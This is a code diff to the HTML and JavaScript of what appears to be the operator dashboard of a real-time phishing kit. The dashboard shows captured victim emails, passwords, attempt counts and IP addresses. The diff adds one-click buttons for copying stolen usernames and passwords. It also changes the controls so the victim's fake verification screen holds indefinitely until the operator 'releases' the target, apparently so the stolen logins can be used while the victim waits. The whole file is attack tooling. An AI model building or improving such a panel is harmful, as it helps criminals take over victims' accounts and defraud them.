@@ -47,6 +47,11 @@
     .attempt-1 { background: rgba(248,81,73,0.15); color: var(--red); }
     .attempt-2 { background: rgba(63,185,80,0.15); color: var(--green); }
 
+    .cred-actions { display: flex; gap: 6px; margin-top: 8px; }
+    .copy-btn { padding: 4px 10px; font-size: 11px; font-weight: 600; font-family: inherit; border-radius: 3px; cursor: pointer; transition: all 0.15s; border: 1px solid var(--border); background: rgba(88,166,255,0.08); color: var(--accent); }
+    .copy-btn:hover { background: rgba(88,166,255,0.18); }
+    .copy-btn.copied { background: rgba(63,185,80,0.15); color: var(--green); border-color: var(--green); }
+
     /* Controls */
     .controls { display: flex; flex-direction: column; gap: 16px; }
     .ctrl-card { background: var(--card); border: 1px solid var(--border); border-radius: 6px; padding: 16px; }
@@ -91,11 +96,9 @@
       </div>
 
       <div class="ctrl-card">
-        <h3>Hold Timer Controls</h3>
-        <button class="ctrl-btn ctrl-btn-extend" onclick="extendHold(15000)">+15s Hold</button>
-        <button class="ctrl-btn ctrl-btn-extend" onclick="extendHold(30000)">+30s Hold</button>
-        <button class="ctrl-btn ctrl-btn-extend" onclick="extendHold(60000)">+60s Hold</button>
-        <button class="ctrl-btn ctrl-btn-force" onclick="forceNext()">Force Next (Release)</button>
+        <h3>Target Controls</h3>
+        <p style="font-size:11px;color:var(--text-dim);margin-bottom:12px;">Verification screen holds indefinitely until you release.</p>
+        <button class="ctrl-btn ctrl-btn-force" onclick="forceNext()">Release Target (Show Next)</button>
       </div>
 
       <div class="ctrl-card">
@@ -129,6 +132,7 @@
 
       var el = document.createElement('div');
       el.className = 'cred-entry';
+      var uid = 'cred-' + count;
       el.innerHTML =
         '<div class="cred-row">' +
           '<span class="cred-email">' + esc(data.email) + '</span>' +
@@ -137,17 +141,16 @@
         '<div class="cred-pass">Password: <code>' + esc(data.password) + '</code>' +
           '<span class="cred-attempt attempt-' + data.attempt + '">Attempt #' + data.attempt + '</span>' +
         '</div>' +
-        '<div class="cred-meta">IP: ' + esc(data.ip) + '</div>';
+        '<div class="cred-meta">IP: ' + esc(data.ip) + '</div>' +
+        '<div class="cred-actions">' +
+          '<button class="copy-btn" onclick="copyToClip(this, \'' + esc(data.email).replace(/'/g, "\\'") + '\')">Copy Username</button>' +
+          '<button class="copy-btn" onclick="copyToClip(this, \'' + esc(data.password).replace(/'/g, "\\'") + '\')">Copy Password</button>' +
+        '</div>';
 
       var body = document.getElementById('feedBody');
       body.insertBefore(el, body.firstChild);
       addLog('Credential captured: ' + data.email + ' (attempt #' + data.attempt + ')');
     });
-
-    function extendHold(ms) {
-      socket.emit('extend_hold', { ms: ms });
-      addLog('Extended hold by ' + (ms / 1000) + 's');
-    }
 
     function forceNext() {
       socket.emit('trigger_next');
@@ -158,6 +161,18 @@
       var d = document.createElement('div');
       d.textContent = s;
       return d.innerHTML;
+    }
+
+    function copyToClip(btn, text) {
+      navigator.clipboard.writeText(text).then(function() {
+        var orig = btn.textContent;
+        btn.textContent = 'Copied!';
+        btn.classList.add('copied');
+        setTimeout(function() {
+          btn.textContent = orig;
+          btn.classList.remove('copied');
+        }, 1500);
+      });
     }
   </script>
 </body>
